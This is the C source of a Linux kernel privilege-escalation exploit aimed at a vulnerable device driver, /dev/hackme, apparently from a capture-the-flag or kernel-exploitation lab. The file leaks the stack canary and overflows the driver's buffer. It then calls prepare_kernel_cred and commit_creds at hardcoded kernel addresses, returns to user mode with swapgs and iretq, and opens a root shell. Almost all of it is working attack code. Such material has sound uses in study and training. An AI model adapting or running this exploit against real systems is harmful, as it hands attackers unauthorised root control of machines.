#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <fcntl.h>
#include <errno.h>

uint64_t user_cs, user_ss, user_rflags, user_sp;
uint64_t prepare_kernel_cred = 0xffffffff814c67f0;
uint64_t commit_cred = 0xffffffff814c6410;

void spawn_shell(void){
    printf("We back to userland!\n");
    uid_t uid = getuid();
    if(uid == 0){
        printf("UID is: %d\nYou just rooted the machine!\n", uid);
    }
    else {
        printf("UID is: %d\nYou didn't root the machine unfortunately..\n", uid);
        exit(-1);
    }
    system("/bin/sh");
}

uint64_t user_rip = (uint64_t) spawn_shell;
void save_state(void){ // save the state of our user context
    __asm__(".intel_syntax noprefix;"
    "mov user_cs, cs;"
    "mov user_ss, ss;"
    "mov user_sp, rsp;"
    "pushfq;"
    "pop user_rflags;"
    ".att_syntax;");
}
void privesc(void){ // return from kernel to user 
    __asm__(".intel_syntax noprefix;"
    "xor rdi, rdi;"
    "movabs rax, prepare_kernel_cred;"
    "call rax;"
    "mov rdi, rax;"
    "movabs rax, commit_cred;"
    "call rax;"
    "swapgs;" 
    "mov r15, user_ss;"
    "push r15;"
    "mov r15, user_sp;"
    "push r15;"
    "mov r15, user_rflags;"
    "push r15;"
    "mov r15, user_cs;"
    "push r15;"
    "mov r15, user_rip;"
    "push r15;"
    "iretq;"
    ".att_syntax;");
}
uint64_t canary(void){
    uint64_t leak[42];
    int fd = open("/dev/hackme", O_RDWR | O_CREAT);
    if (fd < 0){printf("Error: couldn't open the target file!!\n");}
    read(fd, leak, sizeof(leak));
    return leak[16];
}
void exploit(void){
    int index = 16;
    uint64_t payload[50];
    payload[index++] = canary();
    payload[index++] = 0x4444444444444444; // rbx
    payload[index++] = 0x4343434343434343; // r12
    payload[index++] = 0x4242424242424242; // rbp
    payload[index++] = (uint64_t)privesc; // return address
    
    int fd = open("/dev/hackme", O_RDWR | O_CREAT);
    if (fd < 0){printf("Error: couldn't open the target file!!\n");}
    write(fd, payload, sizeof(payload));
}


int main(int argc, char **argv){
    save_state();
    exploit();
    return 0;
}